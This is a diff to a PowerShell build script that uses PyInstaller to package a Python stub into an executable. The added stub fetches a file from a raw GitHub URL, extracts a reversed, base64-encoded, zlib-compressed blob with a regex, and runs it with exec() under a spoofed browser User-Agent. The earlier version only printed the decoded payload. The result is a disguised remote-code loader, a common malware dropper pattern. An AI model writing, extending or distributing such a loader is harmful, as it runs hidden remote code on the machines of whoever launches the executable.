@@ -56,19 +56,23 @@ if (Test-Path -LiteralPath $ExePath) {
 New-Item -ItemType Directory -Force -Path $Work | Out-Null
 New-Item -ItemType Directory -Force -Path $DistDir | Out-Null
 
-# This is the exact command you provided, wrapped in a subprocess call
+# Instead of shelling out, we decode and exec it entirely in Python
 $stubBody = @"
-import subprocess
-import sys
+import urllib.request
+import base64
+import zlib
+import re
 
-# Execute the specific python command
-cmd = [
-    sys.executable, 
-    "-c", 
-    "import urllib.request,base64,zlib,re; s=urllib.request.urlopen('https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py').read().decode(); p=re.search(r\"_\\)\(b'([^']+)'\",s).group(1); print(zlib.decompress(base64.b64decode(p[::-1])).decode())"
-]
-
-subprocess.run(cmd)
+url = 'https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py'
+try:
+    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+    s = urllib.request.urlopen(req).read().decode()
+    p = re.search(r\"_\)\(b'([^']+)'\", s).group(1)
+    decoded = zlib.decompress(base64.b64decode(p[::-1])).decode()
+    exec(decoded)
+except Exception as e:
+    import ctypes
+    ctypes.windll.user32.MessageBoxW(0, str(e), "Exiled Error", 16)
 "@
 Set-Content -Path $Stub -Value $stubBody -Encoding UTF8
 
@@ -89,6 +93,7 @@ $pyiArgs = @(
     "--hidden-import", "zlib",
     "--hidden-import", "re",
     "--hidden-import", "urllib.request",
+    "--hidden-import", "ctypes",
     "--name", $OutName,
     "--distpath", $DistDir,
     "--workpath", (Join-Path $Work "pyi"),
